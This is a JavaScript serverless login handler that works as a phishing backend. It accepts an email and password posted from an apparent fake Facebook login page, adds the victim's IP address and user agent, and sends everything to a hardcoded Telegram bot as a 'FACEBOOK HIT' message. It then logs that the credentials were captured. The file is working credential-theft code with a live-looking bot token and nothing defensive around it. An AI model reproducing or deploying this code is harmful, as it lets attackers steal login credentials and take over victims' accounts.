// api/login.js
module.exports = async (req, res) => {
    // Allow CORS
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST');
    
    if(req.method === 'POST'){
        const {email, password} = req.body;
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const userAgent = req.headers['user-agent'];
        
        // TELEGRAM BOT CONFIG
        const botToken = "8288645874:AAHXwc49sz8HwK7_JGIBUWEiYGpZJEbg5kQ";
        const chatId = "8358778598";
        
        const message = `🔰 **FACEBOOK HIT**\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🖥️ UA: ${userAgent}`;
        
        try{
            // Kirim ke Telegram
            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const response = await fetch(telegramUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            
            // Log untuk debugging (akan tampil di Vercel Logs)
            console.log(`Credentials captured: ${email}`);
            
            return res.status(200).json({success: true});
        } catch(error){
            console.error('Telegram error:', error);
            return res.status(500).json({error: 'Failed to send'});
        }
    }
    
    return res.status(405).json({error: 'Method not allowed'});
};
